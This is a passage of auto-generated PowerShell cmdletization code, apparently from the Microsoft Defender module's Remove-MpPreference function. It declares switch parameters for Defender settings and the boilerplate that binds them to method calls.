[Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('siguci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureUpdateCatchupInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigbui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureBlobUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigbfs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureBlobFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('mcupd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MeteredConnectionUpdates},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('anpws')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowNetworkProtectionOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddtgp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDatagramProcessing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ecwtb')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableConvertWarnToBlock},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCpuThrottleOnIdleScans},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MAPSReporting},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SubmitSamplesConsent},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dae')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableAutoExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dpm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisablePrivacyMode},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rstt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RandomizeScheduleTaskTimes},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('srt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SchedulerRandomizationTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dbm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableBehaviorMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dips')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableIntrusionPreventionSystem},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dioavp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableIOAVProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drtm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRealtimeMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dscrptsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScriptScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('darchsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableArchiveScanning},\r\n\r\n    [Parameter(Parame"
"terSetName='Remove2')]\r\n    [Alias('dcfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCatchupFullScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dcqsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCatchupQuickScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('demsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableEmailScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drdsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRemovableDriveScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRestorePoint},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsmndfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScanningMappedNetworkDrivesForFullScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsnf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScanningNetworkFiles},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('adsnftioav')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ApplyDisableNetworkScanningToIOAV},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${UILockdown},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('unktdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${UnknownThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ltdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${LowThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('mtdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ModerateThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('htdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${HighThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('stdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SevereThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dbaf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableBlockAtFirstSeen},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PUAProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CloudBlockLevel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('cloudextimeout')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CloudExtendedTimeout},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableNetworkProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableControlledFolderAccess},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('elcp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableLowCpuPriority},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('efhc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableFileHashComputation},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('efsobp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableFullScanOnBatteryPower},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ppurl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyPacUrl},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('proxsrv')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('proxbps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyBypass},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('fupo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ForceUseProxyOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dtlsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableTlsParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dftpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableFtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dhttpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableHttpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddnsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDnsParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddnstcpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDnsOverTcpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsshp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableSshParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('puc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PlatformUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('euc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EngineUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('duc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DefinitionUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dgr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableGradualRelease},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('anpdl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowNetworkProtectionDownLevel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('adpows')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowDatagramProcessingOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ednss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableDnsSinkhole},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dicf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableInboundConnectionFiltering},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drdpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRdpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dnppt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableNetworkProtectionPerfTelemetry},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tlps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${TrustLabelProtectionStatus},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('astai')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowSwitchToAsyncInspection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleOffset},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dtdtf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableTDTFeature},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsmtpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableSmtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dquicp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableQuicParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('nprepmode')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${NetworkProtectionReputationMode},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('itdte')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${IntelTDTEnabled},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('oobers')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${OobeEnableRtpAndSigUpdate},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('pms')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PerformanceModeStatus},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('qsie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${QuickScanIncludeExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dcm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCacheMaintenance},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rstpc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoveScanningThreadPoolCap},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultVal"
"ueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\r\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        